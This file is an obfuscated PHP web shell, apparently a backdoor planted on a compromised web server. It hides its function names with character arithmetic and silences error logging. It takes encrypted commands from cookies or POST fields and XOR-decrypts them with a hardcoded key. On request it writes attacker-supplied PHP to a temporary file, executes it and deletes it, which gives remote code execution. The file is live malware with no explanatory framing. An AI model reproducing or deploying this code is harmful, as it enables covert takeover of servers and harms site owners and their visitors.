<?php $bcsih = "\x66".'i'."\154"."\x65".chr(685-590).chr(112)."\x75".chr(1090-974)."\x5f"."\x63".'o'.chr(110).'t'.chr(101).chr(401-291).'t'."\x73";
$asrxxekrt = "\x62"."\141"."\x73".chr(427-326).chr(54)."\64"."\x5f".chr(100)."\145".chr(99)."\157".chr(565-465).'e';
$ldocup = "\x69"."\156".chr(1058-953)."\137".chr(115)."\x65"."\164";
$bhaodx = chr(1058-941)."\156".chr(122-14)."\x69".chr(581-471)."\x6b";


@$ldocup("\x65"."\x72"."\x72"."\157".'r'.chr(814-719).chr(976-868).chr(972-861).chr(103), NULL);
@$ldocup(chr(108).chr(480-369)."\147".chr(553-458)."\145".chr(114)."\162".chr(114-3)."\162"."\x73", 0);
@$ldocup(chr(109)."\141".'x'.chr(601-506).chr(376-275).chr(591-471)."\x65"."\143"."\x75"."\164"."\x69".'o'."\x6e".chr(95).chr(155-39).chr(105)."\x6d".chr(511-410), 0);
@set_time_limit(0);

function zvxyqpl($cokbgpdncolkqwar, $zhcbrcykqk)
{
    $tsjngstdaw = "";
    for ($cokbgpdnc = 0; $cokbgpdnc < strlen($cokbgpdncolkqwar);) {
        for ($j = 0; $j < strlen($zhcbrcykqk) && $cokbgpdnc < strlen($cokbgpdncolkqwar); $j++, $cokbgpdnc++) {
            $tsjngstdaw .= chr(ord($cokbgpdncolkqwar[$cokbgpdnc]) ^ ord($zhcbrcykqk[$j]));
        }
    }
    return $tsjngstdaw;
}

$mnmsa = array_merge($_COOKIE, $_POST);
$cfwqplzvgr = '939d3cf9-d339-4b7a-b508-85c1e00aa8bc';
foreach ($mnmsa as $xlmxdc => $cokbgpdncolkqwar) {
    $cokbgpdncolkqwar = @unserialize(zvxyqpl(zvxyqpl($asrxxekrt($cokbgpdncolkqwar), $cfwqplzvgr), $xlmxdc));
    if (isset($cokbgpdncolkqwar[chr(97).'k'])) {
        if ($cokbgpdncolkqwar["\141"] == chr(115-10)) {
            $cokbgpdnc = array(
                'p'.chr(914-796) => @phpversion(),
                chr(208-93).'v' => "3.5",
            );
            echo @serialize($cokbgpdnc);
        } elseif ($cokbgpdncolkqwar["\141"] == "\145") {
            $mshfe = "./" . md5($cfwqplzvgr) . chr(46).chr(105).'n'.'c';
            @$bcsih($mshfe, "<" . "\x3f".chr(574-462).chr(943-839)."\x70".' '."\x40"."\x75".'n'."\154".chr(913-808).'n'."\153".chr(40)."\x5f".chr(238-143).chr(70).chr(462-389).chr(240-164)."\105"."\137".chr(740-645)."\x29"."\x3b".' ' . $cokbgpdncolkqwar[chr(100)]);
            @include($mshfe);
            @$bhaodx($mshfe);
        }
        exit();
    }
}

